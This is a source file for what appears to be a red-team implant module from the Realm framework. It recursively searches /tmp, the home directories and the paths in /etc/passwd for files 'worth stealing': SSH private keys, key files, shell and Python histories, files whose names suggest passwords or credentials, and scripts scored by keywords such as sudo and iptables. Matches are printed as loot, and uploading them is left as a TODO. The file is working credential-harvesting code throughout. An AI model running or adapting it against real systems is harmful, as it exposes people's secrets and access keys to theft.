usernfo = sys.get_user()
usernfo["root"] = usernfo["euid"]["uid"] == 0

PERM_READ = 4
PERM_WRITE = 2
PERM_EXEC = 1


WANTED_COUNT = 50 # How many tokens we need to upload a script

# User supplied tokens
input_params = {"toks": ""}
custom_toks = input_params['toks'].split()

# Extensions we yoink
suffixes = [".key", ".python_history", ".bash_history", "id_rsa", "id_ed25519"]

# files with this in the name are cool
fname_contains = ["password", "cred", "iptable", "firewall"] + custom_toks

# If the script contains a few of these, we take it
# Bigger number = cooler script
script_contains = {
    usernfo["uid"]["name"]: 10, # Username
    "root": 5,
    "bash": 1,
    "iptables": 7,
    "/bin/sh": 1,
    "drop": 1,
    "accept": 1,
    "wget": 7,
    "git": 4,
    "clone":6,
    "sudo":7,
    "password":8,
    "passwd":8,
    "github": 1,
    "chain": 9,
    "(policy": 20,
    "flush": 6,
    "j": 2,
}
# Add the user supplied tokens
for t in custom_toks:
    if t.strip():
        script_contains[t] = 50

# Strings to match in the MAGIC of a file, JSON is too noisy
types = [] + custom_toks

def effective_perms(f):
    """Return if the user has permisions to r/w/x this file or directory
    return:
        r - Can the user read the file
        w - Can the user write the file
        x - Can the user execute the file
        exec - Is the file executable by anyone
        immutable - NOT IMPLEMENTED: TODO: No way to get this info
    """
    res = {"r": False, "w": False, "x": False, "exec": False, "immutable": False}
    f_user = int(f["permissions"][-3]) # User byte
    f_group = int(f["permissions"][-2]) # Group byte
    f_world = int(f["permissions"][-1]) # World byte applies to everyone

    # If ANYONE can execute it, this file is marked as executable
    if any((f_world & PERM_EXEC, f_group & PERM_EXEC, f_user & PERM_EXEC)):
        res["exec"] = True
    
    # If the user isnt root and the user doesnt own the file, clear the user byte   
    if not usernfo["root"] and f["owner"] not in (usernfo["euid"]["name"], usernfo["uid"]["name"]):
        f_user = 0
    
    # TODO: https://github.com/spellshift/realm/issues/570
    # Will NOT match any group other than primary until #570 is fixed

    # If the user isnt root and the group doesnt own the file, clear the group byte    
    if not usernfo["root"] and f["group"] not in (str(usernfo["egid"]), str(usernfo["gid"])):
        f_group = 0

    # Add the perms if they match
    if any((f_world & PERM_EXEC, f_group & PERM_EXEC, f_user & PERM_EXEC)):
        res["x"] = True
    if any((f_world & PERM_WRITE, f_group & PERM_WRITE, f_user & PERM_WRITE)):
        res["w"] = True
    if any((f_world & PERM_READ, f_group & PERM_READ, f_user & PERM_READ)):
        res["r"] = True
    
    # TODO: https://github.com/spellshift/realm/issues/572
    # strip write perm if file is immutable
    return res

def listdir(path, depth=1, ignore_dirs=[], handler=None):
    """List all files in the given path up to <depth>. If ignore_dirs is passed, directories with that name
    will be skipped"""
    if depth <= 0:
        return []
    files = []

    # TODO: https://github.com/spellshift/realm/issues/569
    # No way to get perms of a path, so this will crash if the initial path is unreadable

    # if not effective_perms(path)["r"]: return
    path = path.rstrip("/")
    if file.is_dir(path):
        for f in file.list(path):
            # Skip files we cant read
            if not effective_perms(f)["r"]:
                continue
            full_name = path + "/" + f["file_name"]
            if f["type"] == "Directory" and depth-1 > 0:
                # Ignore certain directories when recursing
                if f["file_name"] in ignore_dirs or full_name in ignore_dirs:
                    continue
                files += listdir(full_name, depth=depth-1, ignore_dirs=ignore_dirs, handler=handler)
            elif f["type"] == "File":
                f = {
                    "name": full_name,
                    "size": f["size"],
                    "effective_perms": effective_perms(f),
                    "raw_perms": f["permissions"],
                    "user": f["owner"],
                    "gid": f["group"],
                }
                if handler:
                    handler(f)
                else:
                    files += [f]
    return files

def percent_text(data, max=10000):
    """Return how much of a file is ascii text"""
    count = 0 # Max bytes to scan
    ascii = 0
    for c in data.elems():
        if count >= max:
            break
        if ord(c) <= 127:
            # Not an ascii character
            ascii+=1
        count += 1
    return ascii/count

def linux_get_paths():
    """Get a big list of paths that we should search in, this includes users
    home directories. This function is specific to *nix"""
    paths = {
        "/tmp": True # Temp can be valueable and contain user scripts
    }
    dirs = file.list("/home")
    for d in dirs:
        if d.get("type") == "Directory":
            # Skip files we cant read
            if not effective_perms(d)["r"]:
                continue
            paths["/home/" + d.get('file_name')] = True

    # See if there are any other home directories that we arent aware of
    for u in file.read("/etc/passwd").splitlines():
        _, _, _, _, _, p, shell = u.split(":")
        # Skip bad users
        if "nologin" in shell or "false" in shell:
            continue
        if p != "/" and file.is_dir(p):
            paths[p] = True
    
    if "/root" in paths and not usernfo["root"]:
        paths.pop("/root")
    return list(paths.keys())



def tokenize_script(filename):
    data = file.read(filename)
    tokens = {}
    data = data.replace(".", " ")
    data = data.replace("-", " ")
    data = data.replace("_", " ")
    data = data.replace("\\n", " ")
    data = data.replace("#", " ")
    for w in data.split():
        w = w.lower().strip("`'\",:")
        if w in tokens:
            tokens[w] += 1
        else:
            tokens[w] = 1
    return tokens

def match_tokens(inputToks):
    """Look through the given tokens and get a new token set thats
    interesting. Calculate the percentage of the interesting tokens.
    if the subset is larger, the script is more interesting"""
    toks = {}
    for i in script_contains:
        if i in inputToks:
            toks[i] = script_contains[i]*inputToks[i]
    return toks, len(toks)/len(inputToks)

def is_file_worth_stealing(f):
    """Check if files are worth stealing from the home directory"""
    # Anything they want to keep safe, i want
    if f["effective_perms"]["immutable"]:
        return True, "immutable"
    
    # Search for interesting file names
    for i in suffixes:
        if f["name"].lower().endswith(i): return True, "suffix: " + i
    for i in fname_contains:
        if i in f["name"].lower():
            return True, "contains: " + i
    
    # Check the magic header for files we want
    magic = sys.shell("file " + f["name"]).get("stdout")
    if not magic:
        return False, ""
    for i in types:
        if i in magic.split(":", 1)[1]:
            return True, "magic: " + i
    
    if " ASCII text" in magic:
        # Check if its a script worth stealing by counting tokens
        toks = tokenize_script(f["name"])
        toks, token_percent = match_tokens(toks)

        # How many hits we have on our tokens
        count = token_percent * 100
        for t in toks.values():
            count += t
        
        if count > WANTED_COUNT and len(toks) > 3 and token_percent > 0.01:
            return True, "token_count"
    
    # TODO: https://github.com/spellshift/realm/issues/576
    # Check out binary files eventually
    return False, ""

def check_file(f):
    b, reason = is_file_worth_stealing(f)
    if b:
        print("[+] FOUND LOOT ["+reason+"]", f["name"]+ "\n")
        # TODO: Can we upload?!
        pass

paths_to_search = linux_get_paths()
for p in linux_get_paths():
    listdir(p, depth=5, ignore_dirs=[".cache", ".config"], handler=check_file)
